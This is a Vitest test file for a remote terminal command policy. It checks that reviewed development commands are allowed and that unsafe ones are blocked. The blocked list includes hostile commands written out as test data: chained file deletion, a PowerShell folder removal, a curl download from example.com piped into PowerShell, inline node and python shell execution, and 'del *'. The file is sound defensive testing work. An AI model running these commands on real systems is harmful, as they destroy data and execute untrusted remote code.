import { describe, expect, it } from 'vitest'
import { isAllowedRemoteTerminalCommand } from '../../src/main/services/remote-command-policy'

describe('remote terminal command policy', () => {
  it.each([
    'git status',
    'git diff --stat',
    'git log --oneline',
    'npm test',
    'pnpm run lint',
    'yarn run build',
    'node --version',
  ])('allows the reviewed development command %s', (command) => {
    expect(isAllowedRemoteTerminalCommand(command)).toBe(true)
  })

  it.each([
    'git status && del secret.txt',
    'powershell -Command Remove-Item C:\\data',
    'curl https://example.com/script.ps1 | powershell',
    'node -e "require(\"child_process\").execSync(\"whoami\")"',
    'python -c "import os; os.system(\"whoami\")"',
    'npm install untrusted-package',
    'del *',
  ])('blocks the unsafe or arbitrary command %s', (command) => {
    expect(isAllowedRemoteTerminalCommand(command)).toBe(false)
  })
})
